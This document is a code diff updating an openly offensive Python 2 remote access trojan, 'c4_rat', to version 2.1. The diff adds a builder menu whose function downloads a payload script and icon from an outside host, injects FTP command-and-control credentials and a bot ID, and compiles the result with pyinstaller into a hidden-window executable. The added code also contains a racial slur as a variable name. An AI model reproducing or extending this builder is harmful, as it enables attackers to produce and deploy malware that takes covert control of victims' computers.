@@ -1,11 +1,24 @@
 #! python2
 # Made by cr4sh3r
-# c4_rat - v2.0
+# c4_rat - v2.1
 
-import Tkinter, urllib2, ctypes, ftplib, wget, time
+import Tkinter, urllib2, ctypes, ftplib, wget, time, os
 
 # These Variables are set by the host
 # Feel free to change their values
+
+art = """
+        ___               _   _                             _
+       /   |             | | | |                           | |
+  ___ / /| |  _ __  _   _| |_| |__   ___  _ __    _ __ __ _| |_
+ / __/ /_| | | '_ \| | | | __| '_ \ / _ \| '_ \  | '__/ _` | __|
+| (__\___  | | |_) | |_| | |_| | | | (_) | | | | | | | (_| | |_
+ \___|   |_/ | .__/ \__, |\__|_| |_|\___/|_| |_| |_|  \__,_|\__|
+             | |     __/ |
+             |_|    |___/      version 2.1
+
+ cr4sh3r                   """
+
 
 # Name of the user
 
@@ -18,8 +31,8 @@ ser = "http://www.example.net/"
 # Server ftp data
 
 ser_host = 'ftp.example.net'
-ser_logi = 'user'
-ser_pasi = 'password'
+ser_logi = 'username'
+ser_pasi = '1234'
 ser_myurl = 'www.example.net'
 
 # Server id
@@ -28,18 +41,6 @@ sid = "01"
 
 # Some other variables...
 # Do not alter!
-
-art = """
-        ___               _   _                             _
-       /   |             | | | |                           | |
-  ___ / /| |  _ __  _   _| |_| |__   ___  _ __    _ __ __ _| |_
- / __/ /_| | | '_ \| | | | __| '_ \ / _ \| '_ \  | '__/ _` | __|
-| (__\___  | | |_) | |_| | |_| | | | (_) | | | | | | | (_| | |_
- \___|   |_/ | .__/ \__, |\__|_| |_|\___/|_| |_| |_|  \__,_|\__|
-             | |     __/ |
-             |_|    |___/      version 2.0
-
- cr4sh3r                   """
 
 usr = ""
 cbi = ""
@@ -397,9 +398,9 @@ def bot_selection():
 
 def menu():
         global ftp
-
         ftplwel = ftp.getwelcome()
         ctypes.windll.user32.MessageBoxA(0, ftplwel, "Welcome!", 1)
+
 
         def botc(event):
             global cbi
@@ -534,6 +535,189 @@ def menu():
         # Main loop
         men.mainloop()
 
+def funsele():
+    funsele = Tkinter.Tk()
+    funsele.configure(background = "#333")
+    funsele.title("c4")
+    funsele.geometry("200x100+300+300")
+
+    def buildo():
+        funsele.destroy()
+        build()
+
+    def contro():
+        funsele.destroy()
+        bot_selection()
+
+
+
+
+    # Explanatory text
+
+    betx = Tkinter.Label(text = "What do you want to do?")
+    betx.configure(background = "#333", foreground="white")
+
+    # Build
+
+    bsb1 = Tkinter.Button(funsele, text = "Build", height = 1, width = 30, command=lambda:buildo())
+    bsb1.configure(background = "#888", foreground="white")
+
+    # Control
+
+    bsb2 = Tkinter.Button(funsele, text = "Control", height = 1, width = 30, command=lambda:contro())
+    bsb2.configure(background = "#888", foreground="white")
+
+    # Packing...
+
+    betx.pack(anchor = "w", side = "top")
+    bsb1.pack(anchor = "w", side = "top")
+    bsb2.pack(anchor = "w", side = "top")
+
+    # Main loop
+
+    funsele.mainloop()
+
+def build():
+    '''
+    Requires Python 2.7 + getpass, ctypes, PIL.ImageGrab, ftplib, urllib,
+    os, time, sys, wget, traceback, urllib2, subprocess and Pyinstaller modules.
+    '''
+
+    # Window
+    bmen = Tkinter.Tk()
+    bmen.configure(background = "#333")
+    bmen.title("c4_rat-v2.0")
+    bmen.geometry("315x320+300+300")
+
+    # Functions
+
+    def gethost(event):
+        global  vir_host
+        vir_host = be1.get()
+        return vir_host
+    def getlogi(event):
+        global vir_logi
+        vir_logi = be2.get()
+        return vir_logi
+    def getpasi(event):
+        global vir_pasi
+        vir_pasi = be3.get()
+        return vir_pasi
+    def getbot(event):
+        global vir_vicid
+        vir_vicid = be4.get()
+        return vir_vicid
+    def geturl(event):
+        global vir_myurl
+        vir_myurl = be5.get()
+        return vir_myurl
+
+    def buildit():
+        wget.download('http://zepikao.my3gb.com/Sh3lz/base.py')
+        wget.download('http://zepikao.my3gb.com/Sh3lz/t.ico')
+        texthe = '''
+#! python2
+
+# Variables
+
+nigga = 0
+
+vir_host = '%s'
+vir_logi = '%s'
+vir_pasi = '%s'
+vir_vicid = '%s'
+vir_myurl = '%s' ''' % (vir_host, vir_logi, vir_pasi, vir_vicid, vir_myurl)
+        editbas =  open('base.py', 'w')
+        editbas.write(texthe)
+        editbas.close()
+        os.system('pyinstaller base.py --onefile -w --clean -i t.ico')
+        os.system('del base.py')
+        os.system('del t.ico')
+        ctypes.windll.user32.MessageBoxA(0, "The building process has finished!", "HEY!", 1)
+
+
+    # Text
+    bumenetext = '''
+    Insert your data...
+    PRESS ENTER TO CONFIRM
+    (HAS TO BE DONE ON EACH ENTRY)'''
+
+    bumenetext = Tkinter.Label(text = bumenetext)
+    bumenetext.configure(background = "#333", foreground="white")
+
+    # Entries
+
+    be1 = Tkinter.Entry(bmen)
+    be1.insert(10,"ftp.example.net")
+    be1.configure(background = "white", foreground="black")
+    be1.bind("<Return>", gethost)
+
+    be1t = Tkinter.Label(text = "Host:")
+    be1t.configure(background = "#333", foreground="white")
+
+    be2 = Tkinter.Entry(bmen)
+    be2.insert(10,"username")
+    be2.configure(background = "white", foreground="black")
+    be2.bind("<Return>", getlogi)
+
+    be2t = Tkinter.Label(text = "Login:")
+    be2t.configure(background = "#333", foreground="white")
+
+    be3 = Tkinter.Entry(bmen)
+    be3.insert(10,"1234")
+    be3.configure(background = "white", foreground="black")
+    be3.bind("<Return>", getpasi)
+
+    be3t = Tkinter.Label(text = "Password:")
+    be3t.configure(background = "#333", foreground="white")
+
+    be4 = Tkinter.Entry(bmen)
+    be4.insert(10,"07")
+    be4.configure(background = "white", foreground="black")
+    be4.bind("<Return>", getbot)
+
+    be4t = Tkinter.Label(text = "Bot ID:")
+    be4t.configure(background = "#333", foreground="white")
+
+    be5 = Tkinter.Entry(bmen)
+    be5.insert(10,"example.com")
+    be5.configure(background = "white", foreground="black")
+    be5.bind("<Return>", geturl)
+
+    be5t = Tkinter.Label(text = "URL:")
+    be5t.configure(background = "#333", foreground="white")
+
+    bbb1 = Tkinter.Button(bmen, text = "BUILD", height = 1, width = 20, command=lambda:buildit())
+    bbb1.configure(background = "#888", foreground="white")
+
+
+
+    # Packing
+
+    bumenetext.pack(side = 'top')
+
+    be1t.pack(side = "top", anchor = "center")
+    be1.pack(side = "top", anchor = "center")
+
+    be2t.pack(side = "top", anchor = "center")
+    be2.pack(side = "top", anchor = "center")
+
+    be3t.pack(side = "top", anchor = "center")
+    be3.pack(side = "top", anchor = "center")
+
+    be4t.pack(side = "top", anchor = "center")
+    be4.pack(side = "top", anchor = "center")
+
+    be5t.pack(side = "top", anchor = "center")
+    be5.pack(side = "top", anchor = "center")
+
+    bbb1.pack(side = "bottom", anchor = "center")
+
+
+    # Main loop
+
+    bmen.mainloop()
+
 # ***(menu_def_end)***
 
 # ***(login_def_start)***
@@ -560,7 +744,7 @@ def login():
                     ctypes.windll.user32.MessageBoxA(0, "404", "ERROR!", 1)
                 elif ucx == usr:
                     root.destroy()
-                    bot_selection()
+                    funsele()
                 else:
                     root.destroy()
                     ctypes.windll.user32.MessageBoxA(0, "Access denied!", "ERROR!", 1)
@@ -586,12 +770,14 @@ def login():
     # Welcome text
     well = Tkinter.Label(text = "Welcome to the c4_rat-v2.0,  _" + hacker +"_  !  ||  Current server : " + sid)
     well.configure(background = "#333", foreground="white")
-    
+
     # Art
     global art
+
     atext = Tkinter.Text(root, wrap='word')
     atext.configure(background = "#333", foreground="white")
     atext.insert('1.0',art)
+
 
     # Login
     e1 = Tkinter.Entry(root)
@@ -612,10 +798,11 @@ def login():
     lt.pack(side = "bottom", anchor = "w")
 
     well.pack(side = "top", anchor = "w")
-    
+
     atext.pack(side = "top", anchor = "center")
 
     # Main loop
+
     root.mainloop()
 
 # ***(login_def_end)***
@@ -624,3 +811,4 @@ def login():
 
 
 login()
+
